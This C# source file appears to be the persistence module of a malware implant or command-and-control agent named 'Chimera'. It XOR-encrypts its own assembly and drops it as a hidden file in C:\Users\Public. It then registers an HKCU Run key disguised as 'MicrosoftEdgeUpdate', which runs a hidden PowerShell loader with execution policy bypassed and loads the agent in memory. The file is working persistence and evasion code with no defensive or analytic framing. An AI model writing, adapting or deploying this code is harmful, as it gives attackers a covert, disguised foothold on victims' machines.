using System;
using System.IO;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // Persist — fileless / encrypted persistence
    // Writes XOR‑encrypted agent to C:\Users\Public\agent.dat
    // Sets HKCU Run key with PowerShell decoder that loads assembly from memory.
    public static class Persist
    {
        private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RegValue = "MicrosoftEdgeUpdate";
        private const string BlobPath = @"C:\Users\Public\agent.dat";
        private static readonly byte XorKey = 0x41;

        public static string Execute()
        {
            try
            {
                // Read own assembly bytes
                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                byte[] raw = File.ReadAllBytes(selfPath);

                // XOR‑encrypt
                byte[] encrypted = new byte[raw.Length];
                for (int i = 0; i < raw.Length; i++)
                    encrypted[i] = (byte)(raw[i] ^ XorKey);

                // Write encrypted blob
                File.WriteAllBytes(BlobPath, encrypted);
                // Set file attributes to hidden
                File.SetAttributes(BlobPath, File.GetAttributes(BlobPath) | FileAttributes.Hidden);

                // PowerShell loader one‑liner
                string loader = $"powershell -ep bypass -Window Hidden -c "$k=0x41;$d=[IO.File]::ReadAllBytes('{BlobPath}');$o=$d|% {{ $_ -bxor $k }};[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())"";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key == null) return "[error] Could not open HKCU Run key.";
                    key.SetValue(RegValue, loader, RegistryValueKind.String);
                }

                return $"[+] Fileless persistence set.\n" +
                       $"    Blob:     {BlobPath} (XOR‑encrypted)\n" +
                       $"    Reg:      HKCU\\{RegKey}\\{RegValue}\n" +
                       $"    Loader:   PowerShell decodes and loads assembly in memory.\n" +
                       $"    No unencrypted .exe on disk.";
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }

        public static string Remove()
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                if (File.Exists(BlobPath))
                {
                    File.Delete(BlobPath);
                    sb.AppendLine($"[+] Deleted {BlobPath}");
                }
            }
            catch (Exception ex) { sb.AppendLine($"[error] {ex.Message}"); }
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key != null && key.GetValue(RegValue) != null)
                    {
                        key.DeleteValue(RegValue);
                        sb.AppendLine("[+] Removed registry Run key.");
                    }
                }
            }
            catch (Exception ex) { sb.AppendLine($"[error] {ex.Message}"); }
            return sb.ToString();
        }
    }
}